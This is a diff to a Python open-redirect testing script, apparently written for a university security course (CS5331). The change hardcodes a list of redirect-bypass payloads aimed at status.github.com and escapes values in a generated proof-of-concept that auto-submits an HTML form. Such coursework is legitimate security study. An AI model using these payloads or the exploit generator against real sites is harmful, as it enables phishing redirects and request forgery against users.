@@ -8,12 +8,13 @@ import os
 import json
 import io
 from urlparse import urlparse
+from urllib2 import unquote
 
 # WARNING: requests MUST be installed.
 # Looks like running sudo apt-get install python-pip will install requests automatically.
 
 # Redirect script for CS5331 Purposes
-# Command: python redirect.py <targetURL> <paramfile> <payloadfile> (cookiefile)
+# Command: python redirect.py <targetURL> <paramfile> (cookiefile)
 # Example: python redirect.py http://target.com/openredirect/openredirect.php param.txt payload.txt cookie.txt
 
 # <targetURL>: Contains the URL you wish to target. Example: http://target.com/openredirect/openredirect.php
@@ -23,8 +24,6 @@ from urlparse import urlparse
 # Gsid=234512213443
 # Gredirect
 # Program will always run in GET mode unless POST params are detected.
-
-# <payloadfile>: Contains the payload needed to redirect to https://status.github.com. MUST HAVE FILE PRESENT.
 
 # (cookiefile) OPTIONAL: If cookie file is present, will attempt to load the cookies into the request. The format is as such:
 # Sample File:
@@ -42,9 +41,9 @@ def main():
     method = "GET"
 
     # if argc <3 or >4, exit and show message
-    if len(sys.argv) < 4 or len(sys.argv) > 5:
-        print 'Usage: python ' + sys.argv[0] + ' <targetURL> <paramfile> <payloadfile> (cookiefile)\n'
-        print 'Example python ' + sys.argv[0] + " http://target.com/index.html param.txt payload.txt cookie.txt\n"
+    if len(sys.argv) < 3 or len(sys.argv) > 4:
+        print 'Usage: python ' + sys.argv[0] + ' <targetURL> <paramfile> (cookiefile)\n'
+        print 'Example python ' + sys.argv[0] + " http://target.com/index.html param.txt cookie.txt\n"
         print 'Refer to source file for details.\n'
         exit(0)
     
@@ -58,13 +57,6 @@ def main():
         print 'Unable to find paramfile'
         exit(0)
     
-    # Get Payload Filename and check for presence of file.
-    payloadFile = sys.argv[3]
-    
-    if not os.path.isfile(payloadFile):
-        print 'Unable to find payloadfile.'
-        exit(0)
-
     #########################################
     #     PREPARE FOR PARAMETER PARSING     #
     #########################################    
@@ -113,12 +105,20 @@ def main():
     #              AND SENDING              #
     #########################################
     
-    payloads = []
+    # PAYLOAD STRINGS
+    payloads = ['//3H6k7lIAiqjfNeN@example.com@status.github.com/messages/',
+                '//XY>.7d8T\205pZM@example.com@status.github.com/messages/',
+                'https://status.github.com/messages/%2e%2e%2f',
+                'https://status.github.com/messages',
+                'https://status.github.com/messages/%2f..',
+                'https://status.github.com/messages/%2f%2e%2e',
+                '////status.github.com/messages/%2e%2e%2f',
+                '//status.github.com/messages',
+                'https://;@status.github.com/messages',
+                '//example.com@status.github.com/messages/%2e%2e%2f',
+                '////%5cexample.com@status.github.com/messages',
+                '////example.com@status.github.com/messages/%2f%2e%2e']
     
-    # Load Payloads into String Array
-    with open(payloadFile, "r") as ins:
-        for line in ins:
-            payloads.append(line.rstrip())
     
     # PREPARE REQUESTS TO SEND. FOR LOOP FOR EACH PAYLOAD. BREAK IF CURRENT PAYLOAD SUCCEEDS
     print 'NOTE: FIRST TWO PAYLOADS ARE GUARANTEED TO FAIL FOR TESTING PURPOSES.'
@@ -157,8 +157,9 @@ def generateExploit(action, params, method, timestamp):
                 'import webbrowser',
                 '',
                 'html = \'<form method=%s action=%s>' % (method, action) + \
-                        ''.join(['<input name=%s value="%s">' % (k, params[k])
-                            for k in params]) + \
+                    ''.join(['<input name=%s value="%s">' % (
+                        k, unquote(params[k]).replace('\\', '\\\\').replace(
+                            "'", "\\'")) for k in params]) + \
                         '</form><script>document.forms[0].submit()</script>\'',
                 'webbrowser.open_new_tab("data:text/html," + quote(html))',
                 'EOF',
@@ -262,6 +263,6 @@ try:
     main()
     
 except IndexError:
-    print 'Usage: python ' + sys.argv[0] + ' <targetURL> <paramfile> <payloadfile> (cookiefile)\n'
+    print 'Usage: python ' + sys.argv[0] + ' <targetURL> <paramfile> (cookiefile)\n'
     print 'Example python ' + sys.argv[0] + " http://target.com/index.html param.txt payload.txt cookie.txt\n"
     print 'Refer to source file for details.\n'
